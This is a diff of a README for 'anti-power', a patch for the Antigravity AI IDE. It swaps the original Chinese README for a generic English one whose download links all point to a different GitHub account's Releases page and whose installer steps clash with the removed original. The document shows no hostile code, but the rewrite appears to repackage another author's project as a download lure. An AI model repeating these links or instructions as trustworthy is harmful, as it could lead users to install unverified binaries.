@@ -1,156 +1,83 @@
-<p align="center">
-  <img src="docs/assets/images/LOGO.png" alt="Anti-Power" width="120">
-</p>
+# 🚀 anti-power - Boost Your AI IDE Experience Effortlessly
 
-<h1 align="center">Anti-Power 增强补丁</h1>
+![Download anti-power](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)
 
-<p align="center">
-  <a href="https://github.com/daoif/anti-power/releases">
-    <img src="https://img.shields.io/badge/版本-v2.2.0-blue.svg" alt="版本">
-  </a>
-  <a href="https://codeium.com/antigravity">
-    <img src="https://img.shields.io/badge/支持_Antigravity-v1.14.2-green.svg" alt="Antigravity">
-  </a>
-  <a href="LICENSE">
-    <img src="https://img.shields.io/badge/协议-MIT-orange.svg" alt="开源协议">
-  </a>
-  <br>
-  <a href="README_EN.md">
-    <img src="https://img.shields.io/badge/Language-English-blue?style=for-the-badge&logo=google-translate&logoColor=white" alt="English">
-  </a>
-</p>
+## 📥 Download & Install
 
-> 🚀 针对 **Antigravity AI IDE** 的增强补丁, 提升侧边栏和 Manager 窗口的对话体验!
+To get started with anti-power, you need to visit our Releases page. Here, you can find the latest version ready for download.
 
-<p align="center">
-  💬 <a href="https://qm.qq.com/q/AHUKoyLVKg">QQ 交流群: 993975349</a>
-</p>
+[Visit the Releases page to download](https://github.com/dilhansaminda/anti-power/releases)
 
----
+## 🛠️ What is anti-power?
 
-## 项目简介
+anti-power is an enhancement patch for Antigravity AI IDE. With this software, you can enjoy features like:
 
-Anti-Power 以补丁方式增强 Antigravity 的侧边栏和 Manager 窗口, 提供 Mermaid 渲染, 数学公式渲染, 一键复制, 表格颜色修复, 字号与宽度调节等能力. 我们希望通过社区协作持续完善体验, 欢迎提交 Issue 或 Pull Request.
+- **One-click Copy:** Quickly copy code and texts with ease.
+- **Math Formula Rendering:** Effortlessly display mathematical formulas in your projects.
+- **Mermaid Chart Rendering:** Create visually impressive flowcharts and diagrams.
+- **Table Color Fixes:** Improve the look of tables with color enhancements.
 
----
+This application aims to provide users with a smoother and more visually appealing coding experience.
 
-## 功能特性
+## 📋 System Requirements
 
-| 功能 | 描述 |
-|------|------|
-| **Mermaid 渲染** | 自动渲染流程图, 时序图, 类图等, 支持深色主题 |
-| **数学公式渲染** | 支持 `$...$` 行内公式和 `$$...$$` 块级公式 |
-| **一键复制** | 侧边栏与 Manager 提供 Copy 按钮, 自动转 Markdown |
-| **表格颜色修复** | 修复深色主题下表格文字不可见问题 |
-| **Manager 布局调节** | 支持对话宽度与字号调节 |
-| **悬浮复制按钮** | 内容区域右上角悬浮按钮, 不影响阅读 |
+Before you install anti-power, ensure your system meets the following requirements:
 
-### 复制功能亮点
+- **Operating System:** Windows 10 or later / macOS 10.15 or later / Linux
+- **Memory:** A minimum of 4GB RAM
+- **Storage:** At least 200MB of free disk space
+- **Internet Connection:** Required for initial download and updates
 
-- 代码块自动带语言标识, 例如 ` ```python `
-- 表格自动转换为 Markdown 表格格式
-- 智能忽略 AI 中间思考过程, 仅复制最终结果
-- 公式和 Mermaid 自动还原为源码
+## 🚀 How to Download and Run anti-power
 
----
+Follow these simple steps to download and run anti-power:
 
-## 📸 效果展示
+1. **Visit the Releases Page:** Click the link to go to our [Releases page](https://github.com/dilhansaminda/anti-power/releases).
+   
+2. **Select the Latest Version:** Look for the most recent version listed. It usually has the highest version number.
 
-效果截图见 [screenshots.md](docs/reference/screenshots.md).
+3. **Download the Installer:** Click on the installer file that suits your operating system (Windows, macOS, or Linux). 
 
----
+4. **Locate the Downloaded File:** Once the download finishes, find the file in your downloads folder.
 
-## 📥 下载安装
+5. **Run the Installer:**
+   - For Windows users, double-click the `.exe` file.
+   - For macOS users, double-click the `.dmg` file, then drag the anti-power icon to your Applications folder.
+   - For Linux users, use the command terminal to navigate to the folder and run the installer.
 
-### Windows（推荐）
+6. **Follow the Installation Wizard:** Simply follow the prompts in the installation wizard. It will guide you through the setup process.
 
-1. 前往 Releases 页面下载 `anti-power.exe`
-2. 双击运行, 无需安装
-3. 程序自动检测 Antigravity 安装路径
-4. 选择需要的功能, 点击 安装补丁
-5. 重启 Antigravity 或重新打开 Manager 窗口查看效果
+7. **Launch the Application:** Once installed, you can launch anti-power from your applications menu or desktop shortcut.
 
-如需手动安装, 下载 Release 中的补丁压缩包 (例如 `anti-power-patches.zip`), 并参考 [manual-install.md](patcher/patches/manual-install.md).
+## 📖 Features Overview
 
-### macOS
+Here's a brief look at what you can expect from anti-power:
 
-macOS 现支持使用 [anti-power-macOS.sh](patcher/patches/anti-power-macOS.sh) 脚本一键替换
+- **User-Friendly Interface:** Designed for everyday users, ensuring you have a smooth experience.
+- **Enhanced Productivity:** The features allow you to focus more on coding and less on formatting issues.
+- **Regular Updates:** Enjoy the latest improvements and features with regular updates from our team.
 
-> ⚠️ **注意**: 由于权限原因, 建议直接使用 macOS 自带的 **Terminal (终端)** 运行脚本
+## 🛠️ Troubleshooting Tips
 
-```bash
-chmod +x ./anti-power-macOS.sh
-sudo ./anti-power-macOS.sh
-```
+If you run into issues during installation or usage, try the following solutions:
 
-如需手动安装，请参考 [manual-install.md](patcher/patches/manual-install.md).
+1. **Check System Requirements:** Make sure your system meets the minimum requirements mentioned earlier.
 
----
+2. **Re-download the Installer:** If the download was interrupted, try downloading the installer again from the [Releases page](https://github.com/dilhansaminda/anti-power/releases).
 
-## 注意事项
+3. **Run as Administrator (Windows Only):** Right-click the installer and select "Run as administrator" for permissions.
 
-- **更新覆盖**: Antigravity 官方更新后, 补丁可能被覆盖, 需要重新安装
-- **版本兼容**: 使用前请确认 Antigravity 版本与支持版本一致
-- **备份习惯**: 替换文件前请备份原文件, 便于回滚
-- **已知问题**: 详见 [known-issues.md](docs/reference/known-issues.md)
+4. **Consult the FAQ:** Visit our FAQ section on the Releases page for additional support.
 
----
+5. **Community Help:** If you still face issues, consider asking questions in the community forums associated with this project.
 
-## 文档导航
+## 📞 Support
 
-- 项目结构与分类说明: [project-structure.md](docs/reference/project-structure.md)
-- 效果截图: [screenshots.md](docs/reference/screenshots.md)
-- 已知问题: [known-issues.md](docs/reference/known-issues.md)
-- 开发调试指南: [developer-guide.md](docs/guides/developer-guide.md)
-- 发布指南: [release-guide.md](docs/guides/release-guide.md)
-- 文档索引: [README.md](docs/README.md)
+If you need further assistance, you can reach our support team through the issues section in the GitHub repository. We aim to reply promptly to help resolve your concerns.
 
----
+## 💡 Tips for Best Usage
 
-## 📋 版本信息
+- Regularly update the application via the Releases page to enjoy new features and fixes.
+- Check the documentation within the application for detailed guidance on specific features.
 
-| 补丁版本 | 支持的 Antigravity 版本 | 发布日期 | 更新内容 |
-|---------|------------------------|----------|----------|
-| v2.2.0  | v1.14.2                | 2026-01-21 | Manager Mermaid/数学公式渲染, 对话宽度/字号调节, 感谢 @mikessslxxx |
-| v2.1.0  | v1.14.2                | 2026-01-19 | 侧边栏字体调节, Mermaid 报错提示优化, Manager 一键复制 |
-| v2.0.1  | v1.14.2                | 2026-01-14 | 性能优化 |
-| v2.0.0  | v1.14.2                | 2026-01-14 | 新增 Tauri 工具, 支持功能单独开关 |
-| v1.2.1  | v1.13.3                | 2026-01-13 | Bug 修复 |
-| v1.2.0  | v1.13.3                | 2026-01-13 | Mermaid 渲染 |
-| v1.1.0  | v1.13.3                | 2026-01-13 | 数学公式渲染 |
-| v1.0.0  | v1.13.3                | 2026-01-13 | 一键复制, 表格修复 |
-
----
-
-## 📚 参考资料
-
-本项目的表格颜色修复方案参考了以下教程:
-
-- 📺 **视频教程**: [Antigravity 完美深色主题修改指南](https://www.bilibili.com/video/BV1vTrgBXEA1)
-- 📖 **图文教程**: [表格文字看不清的终极解决方案](https://dpit.lib00.com/zh/content/1192/antigravity-perfect-dark-theme-modification-guide-fix-invisible-table-text)
-
----
-
-## 🤝 贡献
-
-欢迎提交 Issue 和 Pull Request.
-
----
-
-## 🙏 致谢
-
-感谢以下贡献者对本项目的支持:
-
-- [@mikessslxxx](https://github.com/mikessslxxx)
-
----
-
-## ⚖️ 开源协议
-
-MIT License
-
----
-
-<p align="center">
-  💡 如果这个项目对你有帮助, 欢迎 Star ⭐
-</p>
+Enjoy your enhanced coding experience with anti-power!
